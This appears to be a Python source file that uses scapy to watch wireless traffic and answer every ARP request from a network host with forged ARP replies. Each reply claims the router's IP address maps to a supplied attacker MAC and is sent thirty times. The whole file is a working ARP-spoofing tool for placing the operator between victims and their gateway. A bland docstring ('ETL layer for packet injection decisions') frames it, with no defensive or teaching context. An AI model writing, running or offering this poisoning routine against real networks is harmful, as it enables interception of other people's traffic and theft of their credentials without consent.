from scapy.layers.dot11 import RadioTap, Dot11
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sendp


class Handler(object):
    """Determines if a given packet should be processed further

    Acts as an ETL layer for packet injection decisions
    """

    def __init__(self, args):
        args = args

        ## Grab injection interface
        self.i = args.i

        ## Grab router IP
        self.rtrIP = args.rtrip

        ## Create target list
        self.newTgts = []


    def process(self, interface, packet, args):
        """Process packets coming from the sniffer."""
        try:
            if packet.haslayer('ARP'):
                if packet[ARP].op == 1 and packet[ARP].psrc != '0.0.0.0':
                    """
                    rtrIp = args.rtrip
                    rtrMac = packet[Dot11].addr1
                    tgtMac = packet[Dot11].addr2
                    tgtIp = packet[ARP].psrc
                    srcMac = args.srcmac
                    """
                    try:
                        arp = Ether(dst = packet[Dot11].addr2, src = args.srcmac) /\
                              ARP(op = 2,
                                  pdst = packet[ARP].psrc,
                                  psrc = args.rtrip,
                                  hwdst= packet[Dot11].addr2)
                        sendp(arp, count = 30, inter = .5)
                    except Exception as E:
                        print(E)
        except:
            return
